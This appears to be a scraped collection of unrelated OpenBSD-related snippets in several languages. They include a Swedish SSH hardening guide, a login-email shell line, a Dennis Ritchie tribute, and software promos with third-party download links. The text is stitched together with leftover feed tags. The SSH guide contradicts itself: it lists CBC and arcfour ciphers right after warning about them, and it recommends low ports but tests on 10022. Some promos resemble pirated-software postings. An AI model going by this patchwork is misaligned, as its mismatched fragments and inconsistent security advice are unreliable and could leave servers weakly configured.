Enter passphrase (empty for no passphrase): M1tt H3ml1g@ löSe40rD 
 Enter same passphrase again: M1tt H3ml1g@ löSe40rD 
Your identification has been saved in /home/johan/.ssh/id_rsa. 
 Your public key has been saved in /home/johan/.ssh/id_rsa.pub. 
 The key fingerprint is: 
 xx:xx:xx:xx:xx:xx:xx:xx:xx:x:xx:xx:xx:xx:xx:xx 
 
Installera den publika nyckeln i systemet 
Den publika nyckeln skall läggas i ~/.ssh/authorized_keys och det kan finnas fler nycklar än en. Se till att göra radmatning mellan nycklarna. 
Om nyckeln skall installeras på samma system kopierar du helt enkelt id_dsa.pub till authorized_keys. 
johan@johan-laptop:~$ cd ~/.ssh 
 johan@johan-laptop:~/.ssh$ cp id_rsa.pub authorized_keys 
Skulle det vara en extern maskin kan du använda scp för att kopiera nyckeln, tänk då på att du inte skriver över authorized_keys om det skulle finnas existerande nycklar i filen. För att kopiera (skriva över befintlig fil) gör du följande 
johan@johan-laptop:~/.ssh$ scp -p ~/.ssh/authorized_keys 192.168.0.1:.ssh/ 
 johan@192.168.0.1’s password:  
 authorized_keys 100% 1839 1.2MB/s 00:00 
Se även till att ~/.ssh/autorized_keys och ~/.ssh/id_rsa endast har gällande användares rättigheter. Vid problem använd chmod 600 för att åtgärda. 
Konfigurera sshd 
Nästa steg är att kontrollera inställningarna för sshd. Filen vi skall modifiera heter /etc/ssh/sshd_config 
Börja med att skapa en säkerhetskopia av sshd_config 
johan@johan-laptop:/$ sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config_backup 
 Password:  
Sedan använder vi lämplig editor för att modifiera sshd_config 
 johan@johan-laptop:/$ sudo nano /etc/ssh/sshd_config 
Följande rader skall ändras: 

LoginGraceTime 120
PermitRootLogin yes
Ciphers

  

LoginGraceTime 30

LoginGraceTime är antalet sekunder innan man blir utkastad om man inte lyckas med inloggningen. Det är en smaksak men 120 sekunder behöver man normalt sätt inte på sig. Sänk den med fördel. Dock bör du hinna ange ditt lösenord innan tiden går ut. 

PermitRootLogin no

Root behöver inte kunna logga in via ssh. Du kan använda sudo istället vilket är mycket säkrare. 
Vi skall även lägga till en så att man förhindrar möjligheten att logga in med hjälp av användarnamn och lösenord vilket betyder att man tvingas använda certifikat. Lägg till: 

PasswordAuthentication no
Ciphers aes128-ctr,aes256-ctr,arcfour256,arcfour,aes128-cbc,aes256-cbc

Ciphers ändrar vi på grund av en potentiell sårbarhet i vissa krypteringsmetoder, mer information om dessa här: 
[1] http://openssh.org/txt/cbc.adv 
[2] http://www.cpni.gov.uk/Docs/Vulnerab…visory_SSH.txt 
[3] http://www.cs.washington.edu/homes/y…pers/TISSEC04/ 
Kontrollera även så att följande rader så att standardinställningarna stämmer: 

Protocol 2
UsePrivilegeSeparation yes
StrictModes yes
RSAAuthentication yes
PubkeyAuthentication yes

Spara och avsluta. 
Nu skall vi bara starta om sshd så att de nya inställningarna tar. 
 johan@johan-laptop:~/.ssh$ sudo /etc/init.d/ssh restart 
 Password: 
 * Restarting OpenBSD Secure Shell server… [ OK ] 
 
Konfigurera ssh för visuell värdnyckel (Visual Host Key) 
När man loggar in mot en viss värd är det inte så lätt att identifiera att det är rätt maskin, någon kan till exempel ha styrt om din DNS till en annan maskin och på så sätt lura dig att logga in i fel maskin för att stjäla kontouppgifter. 
För att lösa detta har gänget bakom OpenSSH utvecklat en visuell representation av nyckeln så att det blir mycket lätt att känna igen sitt egna system. För att aktivera VisualHostKey skall man ändra i antingen /etc/ssh/ssh_config vilket gäller alla användare eller ~/.ssh/config för en personlig inställning 
Lägg till följande i konfigurationen (“Host * finns redan överst i ssh_config) 
Host *  
 VisualHostKey yes 
Byta från standardport 22? 
Det innebär ingen direkt ökad säkerhet att ändra port, men man slipper de flesta script-kiddies attacker och maskar när man flyttar sig från standardportar. Detta gäller samtliga tjänster och inte bara ssh. Det man kan skydda sig mot genom “säkerhet via oreda” är att en mask eller script som snabbt scannar nätet efter en ev. 0-day sårbarhet missar systemet vilket är mer tur än skicklighet för om någon verkligen vill in så gör man en mer noggrann kontroll av det system man vill in i. Om man ändå vill byta är det bäst att lägga sig mellan 0 och 1023 då dessa är  privilegierade vilket betyder att endast konton med administrativa rättigheter kan starta tjänster och därför slipper man hamna i en riggad tjänst startad av en användare som t.ex. loggar lösenord. 
Testa och verifiera 
Testa att logga in i systemet. Glöm inte av att du har bytt port. Du måste även ange användarnamn om du inte har samma användarnamn på fjärrdatorn som den lokalt inloggande användare. Detta gör du genom att skriva användarnamn@server.ip 
johan@johan-laptop:/$ ssh johan@localhost -p 10022 
Host key fingerprint is 66:12:14:8a:31:23:4f:86:13:f2:1c:4d:33:dd:d4:67

Enter passphrase for key ‘/home/johan/.ssh/id_dsa’: 
Nu är du säkert inloggad i ditt system

  <summary><![CDATA[Die WordPress-Referrer haben mir einen alten Beitrag über OpenBSD-Security nach oben gespült, in dem Linus Torvalds in seiner unnachahmlichen Art damit zitiert wird, daß er die OpenBSD-Entwickler für Securitywixer hält. Leider muß ich ihm zwischenzeitlich zustimmen. 
Mich persönlich hat OpenBSD vor 2 Jahren beim Übergang von 4.6 zu 4.7 mit einer weitreichenden Änderung an der Firewallkonfiguration abgehängt, bei der Rewrite- und Filterregeln vereinigt wurden. Theoretisch betrachtet eine Vereinfachung. Praktisch leider mit dem Haken, daß es keinen Migrationspfad gab, um Regeln Zug um Zug umzustellen, denn mit Einführung der neuen Regeltypen waren die alten Regeln nicht mehr verfügbar. Die einzige Möglichkeit war, das gewachsene Regelwerk im Blindflug komplett umzustellen. 
Die OpenBSD-Community zuckte mit den Schultern und verwies auf mein Testsystem, auf dem ich die Regeln ja testen kann. Was den Blindflug bei der Inbetriebnahme nicht minderte. Schade. Seitdem verzichte ich bei Installationen, die auch ohne Kopfschmerzen mal ein oder zwei Updates überstehen sollen, auf OpenBSD und greife lieber zu Debian Linux.]]></summary>

  <summary><![CDATA[Selesai instalasi sistem operasi OpenBSD pasti penasaran bagaimana untuk bisa melakukan pergantian default “hostname” pada OpenBSD karena agak sedikit berbeda posisinya, namun hal tersebut janganlah dinaggap susah coba lakukan di console/ssh dengan akses “superuser” atau “root” setelah itu editlah isi file  /etc/myname dan simpan jika sudah selesai. Terakhir, cobalah untuk merestart nya dan perhatikan nama hostname yang baru pada saat login.

  <summary><![CDATA[Sistem operasi OpenBSD sudah terinstalasi dengan baik dan hostname sudah dikonfigurasi maka hal selanjutnya adalah bagaimana menetepkan “default gateway” nya di OpenBSD. Sekali lagi, penerapan pada sistem operasi tersebut agak sedikit berbeda dibandingkan Linux. Pada OpenBSD default-hostname diletakkan pada file  /etc/mygate dan masukkan alamat IP routernya didalam file tersebut. Selesai merubah file tadi maka coba lakukan “ping” dan tentunya konfigurasi kartu jaringan harus berhasil sebelum melaksanakan pergantian defaul-hostname ini.

  <summary><![CDATA[Punya virtual private server dengan isi sistem operasi OpenBSD? Jika ya, maka Anda akan sedikit menunggu lama ketika sistem baru dinyalakan, ini dikarenakan ada nya delay pada menu bootingnya. Hal ini tentu saja bisa disiasati dengan cara merubah “timeout” nya menjadi ke angka yang lebih kecil sehingga proses bootingpun berjalan cepat. Langkahnya adalah sebagai berikut yaitu dengan mengedit isi file  /etc/boot.conf dan isikan/tambahkan  set timeout 3Setelah itu simpan dan cobalah untuk merestart OpenBSD nya.

  <title><![CDATA[Email on successful login]]></title>
  <summary><![CDATA[If you have a server that you know nobody really should login to, it can be a good idea to track the few logins the server gets. I have done this on my OpenBSD router by telling /etc/profile (who runs on every login) to send me an email about every successful login. The line I added to /etc/profile looks like this: 
echo -e ”Login on `hostname` `date` \n\n# w $(whoami)\n`w $(whoami)` \n\n# who -HTu\n`who -HTu`” | mail -s ”Login on `hostname` as (`whoami`)” root 
What this do is that it collect some useful information about the user that has just logged in and sends an email to the root user. If you do not have set up an alias for the user it is possible to change ”root” in the command above to an email address. The email will look like: 
Subject: Login on gw.localdomain as (username) 
Login on gw.localdomain Sat Dec 17 12:04:17 CET 2011

  <title><![CDATA[Dennis Ritchie, el señor de las computadoras (y sus lenguajes)]]></title>
  <summary><![CDATA[Dennis Ritchie (9 de septiembre 1941 - 12 octubre 2011) fue un investigador y científico computacional cuya influencia en el mundo de la computación se considera mayúscula.    Dennis Ritchie en 1999En 1967 entró a trabajar en los laboratorios Bell donde formó parte de los equipos de trabajo que desarrollaron el SO MULTICS (antecedente de UNIX) y los lenguajes de programación BCPL, ALTRAN y B (antecedente directo de C). En 1969 formó un equipo de trabajo lidereado por Ken Thompson y apoyado por Douglas McIlroy, Rudd Canaday, Joe Ossanna y él mismo para diseñar un SO derivado de MULTICS (Multiplexed Information and Computing System), más general y flexible. Como el objetivo de MULTICS era hacer muchas tareas al mismo tiempo, el nuevo sistema operativo se concentaría en hacer una tarea, y hacerla bien, también se diseñó como un sistema multiusuario y de tiempo compartido; como juego de palabras,se le empezó a llamar UNICS, como UNICS es un homófono en inglés de eunuchs (eunucos) se rebautizó como UNIX.  Ken Thompson y Dennis Ritchie, parte del equipo de trabajo original que diseñó al sistema operativo UNIX.  A partir de 1969 Dennis Ritchie empieza a diseñar un nuevo lenguaje de programación al que llamó C basado en el lenguaje interpretado B y más estructurado que su primer intento BCPL. Hacia 1972 el diseño ya estaba lo suficientemente perfeccionado para que el propio Ritchie escribiera un compilador y se pudiera reescribir todo el kernel de UNIX (escrito originalmente en ensamblador para la PDP-11). Precisamente en 1972 el sistema operativo UNIX se  empezó a instalar en centros de cómputo de investigación y desarrollo empresarial (departamentos I+D). En estos años, apenas se contabilizaban 10 instalaciones de UNIX, pero se esperaba que este número aumentara. Después se introdujo a distintas universidades donde fue pulido y aumentado, con el tiempo se le agregaron estándares de red, seguridad, flexibilidad, se agregaron programas y herramientas libres hasta llegar al poderoso, flexible y omnipresente sistema UNIX de hoy en día. Los conceptos, filosofía y estándares de UNIX han servido de base para la creación y desarrollo del sistema operativo Linux, los sistemas UNIX y su código también forman los cimientos de los SOs Mac OS X y Android.  Las mascotas de los sistemas operativos basados en UNIX. De izquierda a derecha: Darwin, el núcleo unix sobre el que está contruido Mac OS X, BSD Unix y FreeBSD (los diablitos), OpenBSD (el pez globo), NetBSD (el diablo con sarape) y Linux, el pingüinito metamórfico. El lenguaje C. Esta fue la principal aportación de Dennis Ritchie; aunque se desarrolló entre 1969 y 1973, aunque en 1972 tuvo su prueba principal al codificar todo el kernel de UNIX. Como es una de las herramientas que son parte de UNIX, se ha usado muy ampliamente para la programación y codificación de sistemas y aplicaciones. Su diseño está pensado para la programación de sistemas, para manipular de forma casi directa a la máquina, dejando casi toda la responsabilidad de chequeo de errores al usuario (esa es la base de su brevedad pero también el punto principal de su crítica).  Portada del libro de presentación del lenguaje. También la estructura, filosofía y conceptos del libro han tenido gran influencia en el mundo de la industria editorial informática. El lenguaje C ha sido uno de los más influyentes del mundo, constituyendo la base para la sintaxis, estructura y hasta para los conceptos de muchos otros lenguajes (sobre todo teniendo en cuenta que lleva activo casi 40 años en el mundo de la computación): AWK, csh, Objective-C, C++, C--, C#, Java, JavaScript, Perl, PHP, etc. Esquema con la evolución de los lenguajes de programación (incompleta, claro).Un último punto: el mundo de la computación se vio golpeado en un breve periodo por tres muertes de personajes destacados: Steve Jobs (5 octubre 2011), Dennis Ritchie (12 octubre 2011) y John McCarthy (diseñador del lenguaje Lisp, 24 octubre 2011), siendo el primero el suceso más sonado y conmemorado, pero su influencia se dio en el mundo de los negocios y la administración, Ritchie y McCarthy fueron científicos computacionales e investigadores informáticos, su influencia y aportaciones de dieron en esferas sociales distintas (aunque interrelacionadas, pero ese es otro tema). El hecho de que tanto Ritchie y McCarthy hayan recibido el premio ACM Turing y Jobs haya cenado con el presidente Obama y haya tenido tantas menciones en los medios es ejemplo suficiente para saber que unos eran académcos destacados y el otro administrador y hombre de negocios influyente. Compararlos no tiene sentido.   3737.18]]></summary>

 [CENTER]VirtualBox 3.2.8.64453 - Final       VirtualBox is a powerful x86 virtualization product for enterprise as well as home use. Not only is VirtualBox an extremely feature rich, high performance product for enterprise customers, it is also the only professional solution that is freely available as Open Source Software under the terms of the GNU General Public License (GPL). Presently, VirtualBox runs on Windows, Linux, Macintosh and OpenSolaris hosts and supports a large number of guest operating systems including but not limited to Windows (NT 4.0, 2000, XP, Server 2003, Vista, Windows 7), DOS/Windows 3.x, Linux (2.4 and 2.6), Solaris and OpenSolaris, and OpenBSD. VirtualBox is being actively developed with frequent releases and has an ever growing list of features, supported guest operating systems and platforms it runs on. VirtualBox is a community effort backed by a dedicated company: everyone is encouraged to contribute while Sun ensures the product always meets professional quality criteria.    Some of the features of VirtualBox     � Modularity. VirtualBox has an extremely modular design with well-defined internal programming interfaces and a client/server design. This makes it easy to control it from several interfaces at once: for example, you can start a virtual machine in a typical virtual machine GUI and then control that machine from the command line, or possibly remotely. VirtualBox also comes with a full Software Development Kit: even though it is Open Source Software, you don't have to hack the source to write a new interface for VirtualBox.   � Virtual machine de******ions in XML. The configuration settings of virtual machines are stored entirely in XML and are independent of the local machines. Virtual machine definitions can therefore easily be ported to other computers.   � Guest Additions for Windows and Linux. VirtualBox has special software that can be installed inside Windows and Linux virtual machines to improve performance and make integration much more seamless. Among the features provided by these Guest Additions are mouse pointer integration and arbitrary screen solutions (e.g. by resizing the guest window).   � Shared folders. Like many other virtualization solutions, for easy data exchange between hosts and guests, VirtualBox allows for declaring certain host directories as "shared folders", which can then be accessed from within virtual machines.    A number of extra features are available with the full VirtualBox release only (see the "Editions" page for details):   � Virtual USB Controllers. VirtualBox implements a virtual USB controller and allows you to connect arbitrary USB devices to your virtual machines without having to install device specific drivers on the host.   � Remote Desktop Protocol. Unlike any other virtualization software, VirtualBox fully supports the standard Remote Desktop Protocol (RDP). A virtual machine can act as an RDP server, allowing you to "run" the virtual machine remotely on some thin client that merely displays the RDP data.   � USB over RDP. With this unique feature, a virtual machine that acts as an RDP server can still access arbitrary USB devices that are connected on the RDP client. This way, a powerful server machine can virtualize a lot of thin clients that merely need to display RDP data and have USB devices plugged in.    What The New    * VMM: properly terminate the VM with an error if the guest is trying to switch to the PAE mode but PAE is disabled in the VM settings   * GUI: switch to native file dialogs (Windows hosts only; bug #5459)   * GUI: don't use native file dialogs on KDE hosts (Linux hosts only; bug #6809)   * 3D support: fixed GL_EXT_texture_sRGB support   * PXE: fixed ZENworks PXE boot regression   * OVF: fixed slower export and larger images under certain circumstances (3.2.6 regression; bug #7073)   * USB: properly signal an interrupt if the port suspend status changes   * USB: respect the remote-only filter   * USB: avoid VM hang when changing the configuration of certain devices (Windows hosts only)   * USB: fix a crash with older Linux kernels and non-ASCII characters in device strings (Linux hosts only; bug #6983)   * PageFusion: fixed conflict with the guest execution feature   * PageFusion: fixed stability issues with a large number of VMs   * PageFusion: fixed host crashes with guest SMP and Win64 guests   * Memory ballooning: fixed problems restoring VMs with pre-allocation enabled   * Bridged networking: fixed performance issue with GRO enabled on bridged device (bug #7059)   * Hostonly networking: fixed performance issue (3.2.6 regression; bug #7081)   * Hard disks: fix auto-reset of immutable disk at VM startup (bug #6832)   * BusLogic: several fixes for Windows NT/2000 and SCO OpenServer guests   * LsiLogic: fixed I/O errors under rare circumstances   * Sharing disks: support for attaching one disk to several VMs without external tools and tricks   * Shared folders: several fixes and performance enhancements for Solaris guests (bugs #4154 and #6512)   * Solaris Installer: added support for remote installations   * Guest Properties API: correctly support enumerating the properties of a running VM with an empty "patterns" field (bug #7171)   * Guest properties: properly delete transient properties on shutdown   * RDP video redirection performance improvements and stability fixes   * Settings: silently fix host audio driver when reading machine XML settings files or OVF written by VirtualBox on a different host OS, for example convert DirectSound to PulseAudio (bug #7209)   * Settings: properly store the NAT network setting in XML settings file version 1.10 and later (bug #6176)   * VBoxManage: handle differencing images with parent UUID correctly in subcommand openmedium disk (bug #6751)   * Web service: enabled HTTP keepalive for much better performance   * Web service: added timestamps to logging output   * Web service: treat 8-bit strings as UTF-8 not ASCII   * X11 Additions: fix for Xorg 6.8 guests (e.g. RHEL4)                                                     http://www.6ybh-upload.com/7mwfdzdy2swl/VirtualBox-3.2.8-64453-Win.exe[/CENTER]

  VirtualBox 3.2.12   VirtualBox - A special program to create a memory of the PC virtual machines. Each virtual machine can contain an arbitrary set of virtual devices, and separate the operating system. Scope of virtual machines is very wide - from performing the functions of software testing to create entire networks, which are easily scaled, load-balance and protect. VirtualBox is free, open source software. In this release peredlagaetsya version with an automatic (silent) installation, the installer is not compressed.    Extras:   There are versions of VirtualBox, intended for installation on virtually all operating systems including Windows, Linux, Macintosh and OpenSolaris. As a "guest" operating system can also be used any operating system including Windows (NT 4.0, 2000, XP, Server 2003, Vista, W7), DOS / Windows 3.x, Linux, and OpenBSD.    Among the main features of the program are the following:   * VirtualBox can run as a GUI-interface or through command line.   * To extend the functions of the program has developed a special set of SDK.   * Parameters of virtual machines are described in XML format and does not depend on the physical computer on which the system works. Therefore, the virtual computer format VirtalBox easily transferred from one PC to another.   * When using the "guest" computer operating systems, Windows or Linux, you can use special tools which substantially facilitate switching between the physical and virtual computers.   * For a quick exchange of files between the guest and the physical PC can do the so-called "shared folders" (Shared folders), which are simultaneously accessible from both of these machines.   * VirtualBox allows you to connect USB-devices to virtual machines, allowing virtual machines to work with them directly.   * VirtualBox fully supports the remote-access protocol RDP (Remote Desktop Protocol). A virtual machine can operate as a RDP-server, allowing you to manage it remotely.    VirtualBox 3.2.12   This is a maintenance release. The following items were fixed and / or added:   VMM: fixed rare host crash when running 64-bit guests on 32-bit hosts (bug # 7577)   VMM: fixed host reboots under rare circumstances due to NMIs triggered by active performance counters (Linux hosts in non-VT-x/AMD-V mode only; bug # 4529)   VMM: fixed out of memory guru meditation for large memory guests (bug # 7586)   VMM: fixed a guru meditation related to large pages   VMM: use new VT-x feature to keep the guest from hogging the CPU   Snapshots: implemented deleting the last remaining snapshot while the VM is running   GUI: perform the checks for exceeding the size limit of the host file system and for broken asynchronous I / O on older Linux kernels with ext4 / xfs file systems not only when starting the VM from scratch but also when starting from a saved state   NAT: fixed memory leak (3.2.0 regression; bugs # 6918, # 7353)   Networking: fixed VM reset handling in e1000   VRDP: fixed rare crash in multimonitor configuration   Display: fixed occasional guest resize crash   Mouse: don't send relative mouse events together with absolute mouse events (3.2.10 regression; bug # 7571)   Keyboard: fixes for the USB keyboard emulation; fixes for Koran keyboards   Serial: don't hang if the host device would block during open (bugs # 5756, # 5380)   Serial: fixed modem status lines (Linux hosts only; bug # 812)   Graphics: Horizontal resolutions are no longer restricted to a multiple of 8 pixels (bug # 2047; requires Guest Additions update).

  <title><![CDATA[How to recover files and data from a faulty hard drive]]></title>
  <summary><![CDATA[Greetings! 
Following on from my post about how to replace a laptop hard disk, this post focuses on data recovery from a faulty hard disk. 
Firstly the reason the laptop hard drive failed on my flat-mates laptop was because  it was overheating. This was a combination of dust inside the case, vista being a bit heavy and some undetected viruses on the machine. So to save yourself issues, if you notice you laptop/desktop getting hot or over heating, make sure that it is free from viruses and give the insides a clean! 
I cannot guarantee that using the method descibed below will recover lost data on a hard disk, as hard drives can break down in many different ways, however it did work for me, so it may do for you. 
Problem: 
Hard disk is faulty and cannot be read correctly. 
Symptoms: 
The disk I recovered data from wouldn’t get past a certain part in the boot-up sequence. I removed the disk from the machine found it to be a SATA drive.  Interestingly if you have a 3.5 inch disk caddy for a SATA disk drive, you may be able to conect a 2.5 inch laptop disk to it (which is what I did). The SATA and power connectors are the same. 
After I removed the disk and put it in a caddy, windows reported that the disk couldn’t be read as it wasn’t formatted. 
Solution: 
After a bit of research and searching I came across two completely free tools that can help you recover data. They are made by the same people, or should I say person, Christophe Grenier at www.cgsecurity.org 
The first one I tried was testdisk http://www.cgsecurity.org/wiki/TestDisk 
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
Interface for Testdisk 
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
It is designed to recover lost partitions. As you can see it doesn’t use a GUI (graphical user interface) instead it uses text commands. Its not too difficult once you get the hang of navigating it using just a keyboard and there is quite a lot of user support if you get stuck on the authors website, including a walk-through guide. 
I tried it several times with different options without success. If it had been successful, I would have been able to read the disk as normal, so I had to try something else, plan B. 
The second piece of software I tried was PhotoRec: http://www.cgsecurity.org/wiki/PhotoRec 
Another text based user interface program! 
This software doesn’t worry about partitions it just looks at the data blocks and clusters on the disk. The upshot of this is that you can recover any data on a disk if the partition table is missing, as long as the drive is not physically damaged in such a way that makes the disk unreadable. This includes previously deleted files and files from a drive that has been re-formatted. 
After going through some of the options in the program, you can choose which type of files you want to recover: 
Choose the file type(s) to recover 
This is extremely useful, as instead of recovering all the data from the disk, you can just recover certain files such as picture/photo files including bmp and jpg files. Of course you can still recover the whole disk if you want to. 
The one downside of recovering all of this data is the original file name will be lost. So if you had a some photos and one of them was called, ‘midnight in paris.jpg’ this information will be lost and instead you will get a list files that looks like this: 
crytpic file names 
This means you will have to go through the results find the photos you want and rename them with a more suitable name. But at least you get your files back! 
It was this second method that enabled me to recover my flat-mates files and make him a very happy chappy indeed. 
Just make sure you have an up to date anti-virus when you recover old data from someone else’s disk! 
Final word 
PhotoRec is a very powerful tool and enables you you recover data from damaged disks. This is not its limit though because it can also recover data from CD-ROM’s and memory cards such as SD and MMC. It also runs on many operating systems: 

DOS/Win9x
Windows NT 4/2000/XP/2003/Vista/2008/7
Linux
FreeBSD, NetBSD, OpenBSD
Sun Solaris
Mac OS X

And can recover data from multiple file formats: 

FAT,
NTFS,
EXT2/EXT3 filesystem
HFS+

Untill next time!]]></summary>

 Advanced Host Monitor Enterprise 8.68 | 16.03 MB       Advanced HostMonitor is a network monitor program. You can create a list of jobs and tests in advance on a 'set and forget' basis. Among the many checks it can do, it can monitor any TCP service, ping a host, retrieve an URL, check the available disk space, and more. It checks network servers at regular intervals and takes pre-defined actions if a device does not respond.    It can provide a visual and sound warning, send an E-mail message to a mailbox, pager or mobile phone, execute another program, etc. All this allowing you to respond to a problem before your users start to complain.HostMonitor is a highly scalable network monitoring software suitable for small and enterprise-level networks. Probably you will say "There are dozens of programs like this"? That is right! But please check what HostMonitor offers and compare its power and flexibility to surprisingly low price: using 60 test methods our software can check almost any parameter of your servers; highly flexible action profiles allow you to start actions in predefined order depending on the test results.   Probably you will say "There are dozens of programs like this"? That is right! But please check what HostMonitor offers and compare its power and flexibility to surprisingly low price:    Features   * using 60 test methods our software can check almost any parameter of your servers;   * highly flexible action profiles allow you to start actions in predefined order depending on the test results;   * HostMonitor creates various log files using different detail levels and file formats (Text, HTML, DBF and ODBC);   * built-in Report Manager allows you to create and customize reports to your liking in a variety of ways;   * using Remote Monitoring Agents for Windows, FreeBSD, Linux, NetBSD, OpenBSD and Solaris you may easily monitor remote networks;   * Web Service, Telnet Service and Remote Control Console simplifies remote management;   * and this is not all...    What's new in Advanced Host Monitor 8.68:   HostMonitor and RMA for Windows:   ? NT Event Log test method allows you to choose compatibility mode. For each test item you may choose "Windows NT API" or "Windows Vista API" mode. If HostMonitor is started on Windows Vista, Windows 2008 or Windows 7 and target host uses one of these operational systems as well, we recommend using "Windows Vista API" mode. Otherwise you should use "Windows NT API" mode that works fine for Windows 2000, Windows XP and Windows Server 2003 as well.   HostMonitor and RMA for Windows:   ? NT Event Log test allows you to specify event source using * as wildcard at the end of the string. E.g. if you type "MsExchange*", HostMonitor will check for events produced by "MsExchangeIS", "MSExhange ActiveSync", "MSExchange ADAccess", etc   ? HostMonitor: new options for IMAP test allows you to check for messages with specific flag, e.g. you may scan for 'ANSWERED', 'UNANSWERED', 'FLAGGED', 'UNFLAGGED', 'SEEN' or 'UNSEEN' messages   ? HostMonitor: when you setup LDAP test for LDAP server that accepts connection on non-standard port but does not support any SSL option, you may add "::sslnone" suffix to hostname (e.g. you may specify target hostname as "primaryDC.mycompany.com::sslnone")   ? HostMonitor and Telnet Service: new command supported: TestInfoByID or TID   ? WMI Explorer: allows you to choose authentication level for remote connections   ? MIB Browser: improved compiler and minor GUI improvements   ? ProcessMeter: minor GUI improvements   ? HostMonitor: "Send message to pager (SNPP)" action could not login to some SNPP servers. Fixed.   ? HostMonitor: in some rare cases Mail Relay tests could lead to high CPU usage. Fixed   ? HostMonitor and RMA for Windows: some peculiarities in Windows API could lead to problem with Count Files test method. In order to correct possible problems some additional checks were added in this version of the software   ? Active RMA: in some cases Active RMA (versions 4.02-4.06) could miss SNMP Trap messages.

[URL=http://www.imageporter.com/gw248zkzji0u/70f1312d817f65999739316.jpg.html][/URL]   R-Studio is a family of powerful and cost-effective undelete and data recovery software. Empowered by the new unique data recovery technologies, it is the most comprehensive data recovery solution for recovery files from FAT12/16/32, NTFS, NTFS5 (created or updated by Windows 2000/XP/2003/Vista), HFS/HFS+ (Macintosh), Little and Big Endian variants of UFS1/UFS2 (FreeBSD/OpenBSD/NetBSD/Solaris) and Ext2FS/Ext3FS (Linux) partitions. It functions on local and network disks, even if such partitions are formatted, damaged or deleted. Flexible parameter settings give you absolute control over data recovery.   The R-Studio data recovery software was originally developed for use by data recovery experts, system administrators, IT professionals, and advanced and experienced computer users. Some of R-Studio's features were even designed exclusively for computer forensic experts, and most R-Studio users don't need every single feature of the software.    Because of the many features presented in R-Studio, there may be inexperienced users who find its interface and abundant functionality a bit confusing. We've actually tried to simplify the software interface as much as possible and have included a detailed Help Manual with the product. However, we recommend to those who still feel uncomfortable with the software after reading the Manual that they start their data recovery experience with the R-Undelete file recovery tool. Its three-step wizard-oriented user interface provides an easier way to perform ordinary data recovery tasks without any compromise to their efficiency. It's the best choice for basic and some advanced data recovery needs. Below you may compare the main features of R-Studio and R-Undelete.    R-Studio utilities recover files:   � Deleted without Recycle Bin, or when Recycle Bin has been emptied;   � Removed by virus attack or power failure;   � After the partition with the files was reformatted, even for different file system;   � When the partition structure on a hard disk was changed or damaged. In this case, R-Studio utilities can scan the hard disk trying to find previously existed partitions and recover files from found partitions.   � From hard disk with bad sectors. R-Studio Data Recovery Software can first copy the entire disk or its part into an image file and then process such image file. This is especially useful when new bad sectors are constantly appearing on the hard disk, and remaining information must be immediately saved.    R-Studio Data Recovery Features :   � Standard "Windows Explorer" - style interface.   � Host OS: Windows 9x, ME, NT, 2000, XP, 2003 Server, Vista.   � Data recovery over the Network. Files can be recovered on network computers running Win95/98/ME/NT/2000/XP/2003/Vista, Macintosh, Linux and UNIX.   � Supported file systems: FAT12, FAT16, FAT32,NTFS, NTFS5 (created or updated by Win2000/XP/2003/Vista), HFS/HFS+ (Macintosh), Little and Big Endian variants of UFS1/UFS2 (FreeBSD/OpenBSD/NetBSD/Solaris) and Ext2FS/Ext3FS (Linux).   � Recognition and parsing Dynamic (Windows 2000/XP/2003/Vista), Basic(MBR) and BSD (UNIX) partitions layout schema and Apple partition map. Dynamic partitions over GPT are supported as well as dynamic partitions over MBR.   � Damaged RAID recovery. If OS cannot recognize your RAID, you can create a virtual RAID from its components. Such virtual RAID can be processed like a real one.   � Creates IMAGE FILES for an entire Hard Disk, Partition or its part. Such image files can be compressed and split into several files to put it on CD/DVD/Flash or FAT16/FAT32. Then the image files can be processed like regular disks.   Data recovery on damaged or deleted partitions, encrypted files (NTFS 5), alternative data streams (NTFS, NTFS 5).   � Recovering data if:   * FDISK or other disk utilities have been run;   * VIRUS has invaded; FAT is damaged; MBR is destroyed.   � Recognizes localized names.   � Recovered files can be saved on any (including network) disks accessible by the host operating system.   � File or disk content can be viewed and edited with the advanced hexadecimal editor. The editor supports NTFS file attribute editing.    New R-Studio features in version 5.x:   - RAID 6 support, including Reed-Solomon and Vertical XOR. Support for custom-specified RAID 6 layouts.   - Advanced object copy. In addition to byte to byte copy of any object visible in the Drives panel, smart copy of partitions and hard drives with size and offset adjustment is available.   - Support for 64- and 32-bit Windows versions. Under a 64-bit Windows, R-Studio overcomes the 3GB RAM limit for a 32-bit application and utilizes all physical RAM installed in the 64-bit Windows machine. This greatly enhances performance of the software, especially when scanning high-capacity disks.

  <title><![CDATA[New partition ends on a cylinder boundary]]></title>
  <summary><![CDATA[Our new partition should end on a cylinder boundary. This means that it will end on some cylinder, head 254, sector 63. But which cylinder? 
Here, you have to resort to some basic math. No, stop screaming; it isn’t that bad: Just get out your calculator. This hard drive has 2,591 cylinders and can hold about 20GB, or 20,000MB. Each cylinder holds roughly the same amount of data. 20,000MB divided by 2591 cylinders equals a little over 7.719MB/cylinder. Dividing the desired partition size in megabytes by the actual MB/cylinder ratio shows that we need 1,036 cylinders for OpenBSD. The first partition goes through partition 891. 891 + 1036 = 1,927, so our OpenBSD partition will end on cylinder 1,927.

  <title><![CDATA[Steve Jobs]]></title>
  <summary><![CDATA[I’m a bit late with this one, because I’ve had to collect my thoughts. 
Firstly, let me say that I… I am sorry for his family and friends, and their suffering and loss. His demise is a loss to the IT community, to some degree, and I would not have wished him dead. Ultimately he was a man with his wildly documented success and somewhat less documented flaws. 
I do have an issue, however. 
The media as a whole seems to be evangelising him, and crediting him far more than is due. I find this disrespectful to the IT industry as a whole, and more so disrespectful to his memory. 
Steve Jobs had a great eye for the future, product design and inciting a fanaticism that few can rival, perhaps aside from the pope. Lets raise a few points though, for historical accuracy: 
Apple created the MP3 player: This is simply not true, and one of the most irritating falsehoods the media seem to perpetuate. Companies such as Creative Labs and iRiver were developing remarkable MP3 players way before Apple even looked at the market. Apple were actually late to this, and I believe only made the splash they did through marketing and fanaticism. If anything, the iPod was a step backwards in it’s reliance on iTunes and proprietary nature. 
Apple created the GUI: Kinda. Apple licenced the ideas of Xerox and benefitted largely due to Xerox’s incompetence and lack of foresight. Xerox even attempted to sue in 1989. Apple did not invent the GUI, they simply made it a commercial product. This is a demonstration of foresight, not genius. 
